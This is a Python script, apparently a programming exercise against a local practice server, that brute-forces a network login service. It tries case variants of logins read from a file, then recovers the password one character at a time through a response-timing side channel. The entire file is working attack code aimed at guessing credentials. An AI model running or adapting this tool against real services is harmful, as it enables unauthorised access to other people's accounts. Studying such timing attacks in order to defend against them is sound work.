

import itertools
import socket
import sys
import json
from string import ascii_lowercase, ascii_uppercase
import time

path_to_login_txt = "logins.txt"


# to run without command line arguments, remove them (sys.argv[1] and sys.argv[2])
# and replace them with "127.0.0.1" (string!) as IP and 9090 (int!) as port, so address will look like this:
# ("127.0.0.1", 9090)


class Connector:
    """ just a class to keep all connection things in one place"""
    def __init__(self):
        self.ip = sys.argv[1]
        self.port = int(sys.argv[2])
        self.client = socket.socket()
        self.address = (self.ip, self.port)
        self.connected = False


class Data:
    """a class that holds data stuff"""
    def __init__(self):
        self.file = open(path_to_login_txt, encoding='utf-8')
        self.login = ''
        self.login_variants = []
        self.password = ''
        self.password_list = iter(itertools.chain(ascii_uppercase, ascii_lowercase, ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9']))


class BruteForce:
    """the main class - used to hold all methods; gets its connection and data from the respective classes"""
    def __init__(self):
        self.connection = Connector()
        self.data = Data()


    def get_password(self):
        """yields next character for the password"""
        for password in self.data.password_list:
            yield password


    def renew_password(self):
        """
        renews the password iterator
        and sends the login/password to the try_password method
        """
        self.data.password_list = iter(itertools.chain(ascii_uppercase, ascii_lowercase, ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9']))
        self.try_password(self.data.login, self.data.password)


    def get_login_variants(self):
        """reads the next login from the login.txt and creates the variants of that login"""
        self.data.login = self.data.file.readline().strip()
        self.data.login_variants = map(''.join, itertools.product(*((c.upper(), c.lower()) for c in self.data.login)))
        # yes, I know that's an abomination... but it works ¯\_(ツ)_/¯


    def get_next_login(self):
        """iterates through the login variants and yields one"""
        for login in self.data.login_variants:
            yield login


    @staticmethod
    def to_json(login, pw):
        """serializes a json with indents from login and pw"""
        to_test = {
            'login': str(login),
            'password': str(pw)
        }
        as_json = json.dumps(to_test, indent=4)
        return as_json


    def connect_disconnect(self):
        """
        connects if not connected and vice-versa
        also closes the file after disconnecting
        """
        if self.connection.connected:
            self.connection.connected = False
            self.connection.client.close()
            self.data.file.close()
        else:
            self.connection.client.connect(self.connection.address)
            self.connection.connected = True



    def try_login(self):
        """
        tries all login variants until the right one is found
        if iterator runs out, it calls the get_login_variants method
        when the correct login was found, we send it over to the 'first_letter' method
        to try and get the first character of the password
        """
        while True:
            try:
                to_test = next(self.get_next_login())
                # password kept empty for now - has to be a space
                # because sending an empty string via sockets = disconnect
                message = self.to_json(to_test, ' ')
                self.connection.client.send(message.encode())
                response = self.connection.client.recv(1024).decode()
                result = json.loads(response)

                if result['result'] == 'Wrong password!':
                    self.data.login = to_test
                    self.first_letter(self.data.login, self.data.password)
                    break

            except StopIteration:
                self.get_login_variants()


    def check_result(self, result, took_seconds):
        """
        checking the result and acting accordingly
        success: print login/pw as json with indent=4
        fail with time taken < 0.1s: character was wrong, send back to try_password without last character
        fail with time taken > 0.1s: character was correct, looking for next one
        """
        if result['result'] == 'Connection success!':
            success = self.to_json(self.data.login, self.data.password)
            self.connect_disconnect()
            print(success)

        if result['result'] == 'Wrong password!' and took_seconds < 0.1:
            self.data.password = self.data.password[:-1]
            self.try_password(self.data.login, self.data.password)

        if result['result'] == 'Wrong password!' and took_seconds >= 0.1:
            self.try_password(self.data.login, self.data.password)


    def try_password(self, login, password):
        """adds another character to the password and tries it, then sends the result to check_result"""
        try:
            self.data.password += next(self.get_password())
            message = self.to_json(login, self.data.password)
            self.connection.client.send(message.encode())
            # starting timer
            time_start = time.time()
            response = self.connection.client.recv(1024).decode()
            time_end = time.time()
            time_taken = time_end - time_start
            result = json.loads(response)
            self.check_result(result, time_taken)

        except StopIteration:
            self.renew_password()


    def first_letter(self, login, password):
        """method to find the first letter of the password"""
        self.data.password = next(self.get_password())
        message = self.to_json(login, self.data.password)
        self.connection.client.send(message.encode())
        time_start = time.time()
        response = self.connection.client.recv(1024).decode()
        time_end = time.time()
        time_taken = time_end - time_start
        result = json.loads(response)

        if result['result'] == 'Wrong password!' and time_taken < 0.1:
            self.first_letter(self.data.login, '')

        elif result['result'] == 'Wrong password!' and time_taken >= 0.1:
            self.try_password(self.data.login, self.data.password)



if __name__ == "__main__":
    instance = BruteForce()
    instance.connect_disconnect()
    instance.get_login_variants()
    instance.try_login()

